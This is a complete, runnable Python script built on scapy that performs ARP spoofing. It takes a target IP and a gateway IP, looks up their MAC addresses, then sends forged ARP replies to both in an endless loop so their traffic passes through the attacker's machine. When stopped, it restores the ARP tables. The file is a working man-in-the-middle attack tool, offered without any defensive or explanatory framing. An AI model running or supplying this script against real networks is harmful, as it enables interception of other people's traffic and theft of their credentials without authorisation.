#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time

def get_arguments() :
    parser = argparse.ArgumentParser(prog="arp_spoof",description='ARP spoofing arguments type.')
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP")
    parser.add_argument("-s","--source",dest="source_ip", help="Source IP")
    options = parser.parse_args()
    if not options.target_ip :
        parser.error("[-] Please specify a Target IP address, use --help for more info.")
    elif not options.source_ip :
        parser.error("[-] Please specify a Source IP address, use --help for more info.")
    return options

def get_mac(ip) :
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip) :
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)
def restore(destination_ip, source_ip) :
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=get_mac(destination_ip),psrc=source_ip,hwsrc=get_mac(source_ip))
    scapy.send(packet, verbose=False, count=4)
def run() :
    options = get_arguments()
    target_ip = options.target_ip
    gateway_ip = options.source_ip
    send_packets_count = 0
    try :
        while True :
            spoof(target_ip,gateway_ip)
            spoof(gateway_ip, target_ip)
            send_packets_count = send_packets_count + 2
            print("\r[+] Sent : " + str(send_packets_count), end ="")
            time.sleep(1)
    except KeyboardInterrupt :
        print("\n[-] Detected CTRL + C .... Resetting ARP Tables.... Please wait.\n")
        restore(target_ip,gateway_ip)
        restore(gateway_ip, target_ip)

if __name__ == "__main__":
    run()